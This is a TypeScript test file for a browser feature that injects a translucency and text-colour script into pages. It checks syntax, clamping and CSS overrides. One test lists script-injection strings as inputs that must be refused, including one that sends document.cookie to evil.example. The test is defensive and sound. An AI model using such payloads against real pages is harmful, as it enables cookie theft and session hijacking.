/**
 * The injected translucency payload.
 *
 * `guestOpacityJs` builds a script by string concatenation and hands it to
 * `executeJavaScript`, which means two whole classes of bug live here and
 * nowhere else:
 *
 *   • a syntax error is invisible until a page is open and the console is
 *     showing — the injection just silently does nothing;
 *   • the text colour is interpolated into that script, so a value that can
 *     close the literal is script injection into every page you browse.
 *
 * Both are cheap to test without a DOM: build the string, parse it with
 * `new Function`, and check what got interpolated. Nothing here executes the
 * payload — there is no document to run it against.
 *
 * Run: npm run test:browser
 */

import test from "node:test";
import assert from "node:assert/strict";

import { guestOpacityJs } from "../guest-opacity";

/** Parses without running. Throws SyntaxError if the payload is malformed. */
function parses(src: string): boolean {
  new Function(src);
  return true;
}

test("the payload is syntactically valid at every combination", () => {
  for (const value of [0, 0.25, 0.5, 1]) {
    for (const color of [null, "#fff", "#e8eef5", "#11223344"]) {
      for (const refresh of [true, false]) {
        assert.ok(parses(guestOpacityJs(value, color, refresh)), `${value}/${color}/${refresh}`);
      }
    }
  }
});

test("opacity is clamped into 0–1, and the floor is zero", () => {
  assert.match(guestOpacityJs(-5), /apply\(0,/);
  assert.match(guestOpacityJs(0), /apply\(0,/);
  assert.match(guestOpacityJs(0.4), /apply\(0\.4,/);
  assert.match(guestOpacityJs(9), /apply\(1,/);
  assert.match(guestOpacityJs(Number.NaN), /apply\(1,/);
});

test("a hex colour is passed through as a quoted string", () => {
  assert.match(guestOpacityJs(0.5, "#e8eef5"), /apply\(0\.5, "#e8eef5", false\)/);
  assert.match(guestOpacityJs(0.5, "  #ABC  "), /apply\(0\.5, "#ABC", false\)/, "trimmed");
});

test("anything that is not a hex colour becomes null", () => {
  // #12345 and #1234567 have a digit count no CSS hex grammar allows.
  for (const junk of ["red", "rgb(0,0,0)", "var(--x)", "", "   ", "#", "#12", "#12345", "#1234567", "#123456789"]) {
    assert.match(guestOpacityJs(0.5, junk), /apply\(0\.5, null,/, JSON.stringify(junk));
  }
});

test("a colour that tries to escape the literal is refused, not escaped", () => {
  // The interesting failure is not that this is sanitised — it is that a
  // payload built this way would otherwise run attacker-chosen code inside
  // every page the browser loads.
  const attacks = [
    '#000"); fetch("https://evil.example/" + document.cookie); ("',
    "#000'; alert(1); '",
    "#000\\\\",
    "#000`; alert(1); `",
    "#000</script>",
    "#000\n});alert(1);(()=>{",
  ];
  for (const attack of attacks) {
    const src = guestOpacityJs(0.5, attack);
    assert.match(src, /apply\(0\.5, null,/, `not neutralised: ${attack}`);
    assert.ok(!src.includes("alert(1)"), `leaked into the payload: ${attack}`);
    assert.ok(!src.includes("evil.example"));
    assert.ok(parses(src));
  }
});

test("the refresh flag is emitted as a real boolean", () => {
  assert.match(guestOpacityJs(0.5, null, true), /apply\(0\.5, null, true\)/);
  assert.match(guestOpacityJs(0.5, null, false), /apply\(0\.5, null, false\)/);
  assert.match(guestOpacityJs(0.5), /apply\(0\.5, null, false\)/, "defaults to the cheap path");
});

test("text and media are exempt from the background pass", () => {
  const src = guestOpacityJs(0.5);
  // The whole point of the rewrite: these never get their backgrounds rewritten,
  // and nothing anywhere sets `opacity` on the document root.
  for (const tag of ["IMG", "VIDEO", "CANVAS", "SVG".replace("SVG", "PICTURE")]) {
    assert.ok(src.includes(`"${tag}"`), `${tag} missing from the skip list`);
  }
  assert.ok(
    !/de\.style\.setProperty\("opacity"/.test(src),
    "the root must never be faded — that is what took the text with it",
  );
});

test("the text override outranks a page's own !important rules", () => {
  const src = guestOpacityJs(1, "#ffffff");
  assert.ok(src.includes(":not(#_rome_never_)"), "the specificity hack is what makes it stick");
  assert.ok(src.includes("-webkit-text-fill-color"), "gradient text stays invisible without this");
  assert.ok(src.includes("::selection"), "selected text needs its fill handed back");
});

test("no colour means no rule at all, rather than a rule that says inherit", () => {
  assert.ok(guestOpacityJs(1, null).includes('sheet.replaceSync(rule)'));
  assert.match(guestOpacityJs(1, null), /:\s*""/, "the empty branch clears the sheet");
});
